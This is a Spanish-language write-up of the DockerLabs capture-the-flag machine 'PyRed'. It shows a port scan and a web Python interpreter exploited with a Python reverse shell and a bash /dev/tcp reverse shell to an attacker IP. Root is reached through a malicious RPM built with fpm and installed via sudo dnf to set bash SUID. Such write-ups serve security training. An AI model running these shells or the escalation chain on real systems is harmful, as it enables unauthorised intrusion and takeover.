# Máquina PyRed

---------------------

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

-----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE REASON
5000/tcp open  upnp    syn-ack
```

Lo abrimos en el navegador:

![Pasted image 20240415012043](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/6e9add48-cee5-45ab-8adf-cea807dbd0f1)

Parece un compilador web donde podemos ejecutar comandos de python. Si por ejemplo ejecutamos:

```python
var = 7 + 7
print(var)
------------------
OUTPUT:
14
```

-------------

## Explotación

Vemos que interpreta python correctamente.
Por lo que trataremos de enviarnos una **Reverse shell**:

Nos pondremos en escucha con **netcat**:

```shell
nc -nlvp 3333
```

Introduciremos en la web:

```python
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.37", 3333))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
```

Siendo la 192.168.1.37 la IP de mi máquina atacante.

Podemos utilizar cualquier **Reverse Shell** con python que queramos. (Las hay más sencillas)

---------------
### Tratamiento de la tty

Si tenemos problemas al aplicar el tratamiento de la **tty**, lo que podemos hacer es ponernos en escucha desde una consola nueva por un puerto. Por ejemplo con **netcat**

```shell
nc -nlvp 443
```

Y nos enviamos desde la máquina víctima una reverse shell para acceder:

```shell
bash -c "bash -i >&/dev/tcp/192.168.1.37/443 0>&1" 
```

(Siendo la 192.168.1.37 mi IP de la máquina atacante)

-------------

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------

## Escalada de privilegios

Hacemos un "**sudo -l**" para ver si podemos ejecutar algo como root.

```shell
sudo -l
----------------------
User primpi may run the following commands on af8905045dea:
    (ALL) NOPASSWD: /usr/bin/dnf
```

Vemos que podemos ejecutar **/usr/bin/dnf**. Herramienta esencial para la administración de paquetes en sistemas Linux basados en Fedora.
Si no sabemos como abusar de esta utilidad, siempre podemos recurrir a [GTFOBins](https://gtfobins.github.io/)

En nuestra máquina atacante crearemos un archivo **.rmp** malicioso. Con el comando que nos interese ejecutar como root.

```shell
TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

Lo transferiremos a la máquina víctima, por ejemplo con un servidor con python en la máquina atacante:

```shell
sudo python3 -m http.server 80
```

Y lo descargamos en la máquina víctima:

```shell
wget http://192.168.1.37/x-1.0-1.noarch.rpm
```

Instalamos el paquete malicioso que hemos creado con **dnf**:

```shell
sudo /usr/bin/dnf install -y x-1.0-1.noarch.rpm
```

Al instalarlo, hemos cambiado la bash a **SUID**.
Como podemos ejecutarla como root:

```shell
bash -p
whoami
-----------------
root
```

Hemos conseguido el nivel de privilegios máximos en la máquina !
